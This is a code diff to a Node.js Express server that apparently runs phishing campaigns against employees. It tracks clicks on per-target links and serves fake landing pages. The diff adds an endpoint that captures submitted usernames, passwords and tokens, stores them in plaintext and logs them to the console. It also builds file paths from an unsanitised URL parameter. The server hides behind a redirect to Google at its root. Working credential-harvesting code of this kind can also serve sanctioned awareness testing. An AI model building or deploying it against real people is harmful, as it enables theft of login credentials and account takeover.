@@ -1,16 +1,40 @@
 require('dotenv').config();
 const express = require('express');
-const { Employee, ClickLog } = require('./models');
+const { Employee, ClickLog, InformationData } = require('./models');
 const path = require('path');
 const app = express();
 const port = 4000;
+const bodyParser = require('body-parser');
+
+app.use(express.static(path.join(__dirname, '../frontend/')));
+
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.json());
 
 app.get('/', (req, res) => {
     res.redirect('https://www.google.com');
 });
 
-app.get('/:uniqueUrl', async (req, res) => {
-    const { uniqueUrl } = req.params;
+app.post('/submit_information', async (req, res) => {
+    try {
+        const { username, password, token, page } = req.body;
+        console.log(req.body);
+        
+        await InformationData.create({
+            username: username,
+            password: password,
+            page: page,
+            token: token
+        });
+        res.status(200).json({ success: true });
+    } catch (error) {
+        console.error('Error saving information data:', error);
+        res.status(500).json({ success: false, message: error.message });
+    }
+});
+
+app.get('/:landingPage/:uniqueUrl', async (req, res) => {
+    const { landingPage, uniqueUrl } = req.params;
 
     // Store the click information in the database
     try {
@@ -28,7 +52,13 @@ app.get('/:uniqueUrl', async (req, res) => {
             });
             console.log('Click logged for valid token.');
             // After storing the click, redirect the user
-            res.redirect('https://www.google.com');
+            const filePath = path.join(__dirname, `../frontend/LandingPages/${landingPage}/${landingPage}.html`);
+            res.sendFile(filePath, (err) => {
+                if (err) {
+                    console.error('Error sending file:', err);
+                    res.status(404).send('Page not found');
+                }
+            });
         } else {
             console.log('Invalid URL:', uniqueUrl);
             res.status(404).send('Page not found');
